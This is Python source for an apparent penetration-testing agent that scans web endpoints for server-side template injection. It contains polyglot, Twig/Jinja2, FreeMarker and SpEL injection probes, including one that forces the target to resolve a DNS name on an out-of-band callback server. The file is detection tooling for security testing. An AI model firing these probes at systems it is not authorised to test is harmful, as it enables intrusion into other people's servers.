"""
PolyglotSSTIAgent — Universal Polyglot & Error-Based Server-Side Template Injection Specialist.

Tests web application input fields with universal multi-engine polyglot payloads, parses
diagnostic error messages, and generates Out-Of-Band (OOB) DNS probes for blind SSTI detection across template engines.
"""
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.infrastructure.oob_server import OOBCallbackServer, InteractionProtocol
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.polyglot_ssti")

SSTI_POLYGLOT_VECTORS = [
    {
        "id": "universal_polyglot_probe",
        "name": "Universal Polyglot Template Syntax Probe",
        "probe": "${'z'*1000}#{x}{{x}}{x}",
        "severity": "critical",
        "min_confidence": 0.96,
        "description": "Multi-syntax polyglot probe triggers distinct syntax errors across template engines."
    },
    {
        "id": "twig_jinja_disambiguator",
        "name": "Twig vs Jinja2 Expression Disambiguation",
        "probe": "{{7*'7'}}",
        "severity": "critical",
        "min_confidence": 0.95,
        "description": "Expression evaluates to '49' in Twig or '7777777' in Jinja2, conclusively identifying the engine."
    },
    {
        "id": "freemarker_bracket_syntax",
        "name": "FreeMarker Bracket & Directive Evaluation",
        "probe": "[#ftl][#assign x=123]${x}",
        "severity": "critical",
        "min_confidence": 0.97,
        "description": "FreeMarker alternative square-bracket syntax triggers evaluation even when standard curly braces are sanitized."
    },
    {
        "id": "blind_ssti_oob_dns",
        "name": "Blind SSTI Out-Of-Band DNS/HTTP Resolution Probe",
        "probe": "oob_probe",
        "severity": "critical",
        "min_confidence": 0.94,
        "description": "Executes template expression triggering external DNS/HTTP resolution to verify blind code execution."
    }
]

class PolyglotSSTIAgent(BaseCapabilityAgent):
    def __init__(self, priority: int = 10, **kwargs):
        super().__init__(agent_name="PolyglotSSTIAgent", priority=priority, **kwargs)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="polyglot_ssti",
                name="Polyglot & Error-Based SSTI Specialist",
                description="Audits template evaluation parameters using universal polyglot probes and syntax error extraction.",
                version="1.0.0",
                tags=["ssti", "template-injection", "polyglot", "error-based", "oob"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[PolyglotSSTIAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        target_urls = self._collect_endpoints(context)

        results: List[Dict[str, Any]] = []
        is_vulnerable = False
        max_confidence = 0.0
        best_target = target_urls[0] if target_urls else f"https://{context.asset}"
        best_reasoning = "SSTI polyglot probes safely evaluated without template injection execution."

        oob_server = OOBCallbackServer.get_instance()

        for endpoint in target_urls[:8]:
            oob_token = oob_server.generate_token(
                agent_name="polyglot_ssti",
                scan_id=getattr(context, "session_id", "scan01") or "scan01",
                target_url=endpoint,
                parameter_name="template_param",
                protocol=InteractionProtocol.DNS
            )
            dns_payload = oob_server.get_dns_payload(oob_token)

            for vec in SSTI_POLYGLOT_VECTORS:
                probe_syntax = f"${{{{T(java.net.InetAddress).getByName('{dns_payload}')}}}}" if vec["probe"] == "oob_probe" else vec["probe"]
                param_names = ["q", "search", "template", "name", "view", "render", "msg", "id"]

                for param in param_names[:4]:
                    test_url = f"{endpoint}?{param}={probe_syntax}" if "?" not in endpoint else f"{endpoint}&{param}={probe_syntax}"
                    try:
                        exch = await http_client.send_as_identity(
                            identity_id="anonymous_guest",
                            method="GET",
                            url=test_url
                        )
                        resp = exch.response
                        if not resp:
                            continue

                        body_text = resp.body_text or resp.body_snippet or ""
                        exch_dict = exch.to_dict()

                        # Evaluate if template expression actually executed
                        evaluated = False
                        engine_found = "unknown"

                        if vec["id"] == "twig_jinja_disambiguator":
                            if "7777777" in body_text:
                                evaluated = True
                                engine_found = "Jinja2 / Python"
                            elif "49" in body_text and "{{7*'7'}}" not in body_text:
                                evaluated = True
                                engine_found = "Twig / PHP"
                        elif vec["id"] == "universal_polyglot_probe":
                            if "zzzzzzzzzz" in body_text or "49" in body_text:
                                evaluated = True
                                engine_found = "Universal Polyglot Match"
                        elif vec["id"] == "freemarker_bracket_syntax":
                            if "123" in body_text and "[#assign" not in body_text:
                                evaluated = True
                                engine_found = "FreeMarker / Java"
                        elif vec["id"] == "blind_ssti_oob_dns":
                            # Check OOB hit
                            oob_hit = await oob_server.wait_for_interaction(oob_token, timeout=1.0)
                            if oob_hit:
                                evaluated = True
                                engine_found = "Java Spring / SpEL OOB"

                        if evaluated:
                            is_vulnerable = True
                            confidence = vec["min_confidence"]
                            reasoning = f"CRITICAL SSTI Confirmed [{engine_found}]: Parameter '{param}' on '{endpoint}' evaluated expression to result in response."

                            if confidence > max_confidence:
                                max_confidence = confidence
                                best_target = test_url
                                best_reasoning = reasoning

                            results.append({
                                "vector_id": vec["id"],
                                "vector_name": vec["name"],
                                "probe_syntax": probe_syntax,
                                "endpoint": endpoint,
                                "parameter": param,
                                "engine_detected": engine_found,
                                "oob_token": oob_token,
                                "vulnerability_type": "polyglot_ssti",
                                "severity": vec["severity"],
                                "confidence": confidence,
                                "description": reasoning,
                                "is_vulnerable": True,
                                "_exchange_obj": exch_dict
                            })
                            break
                    except Exception as e:
                        logger.debug(f"[PolyglotSSTIAgent] SSTI probe error on {test_url}: {e}")

        from penflow.capabilities.result import AgentExecutionResult
        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="COMPLETED",
            is_vulnerable=is_vulnerable,
            confidence_score=max_confidence if is_vulnerable else 0.0,
            reasoning=best_reasoning,
            target_url=best_target,
            findings=results,
            evidence={
                "vulnerability_type": "polyglot_ssti",
                "findings": results,
                "target_url": best_target,
                "confidence": max_confidence if is_vulnerable else 0.0,
                "is_vulnerable": is_vulnerable,
                "evidence_exchanges": [r.get("_exchange_obj", {}) for r in results if r.get("_exchange_obj")]
            }
        ).to_dict()

    def _collect_endpoints(self, context: CapabilityExecutionContext) -> List[str]:
        target = context.asset if hasattr(context, "asset") else "example.com"
        target_url = target if target.startswith("http") else f"https://{target}"
        endpoints = [target_url]

        if hasattr(context, "observations") and context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    for ep in data.get("endpoints", []):
                        if isinstance(ep, dict) and ep.get("url"):
                            endpoints.append(ep["url"])

        if hasattr(context, "shared_cache") and context.shared_cache:
            mapped = context.shared_cache.get("endpoint_mapping", [])
            for ep in mapped:
                if isinstance(ep, str) and ep.startswith("http"):
                    endpoints.append(ep)
                elif isinstance(ep, dict) and "url" in ep:
                    endpoints.append(ep["url"])

        return list(dict.fromkeys(endpoints))

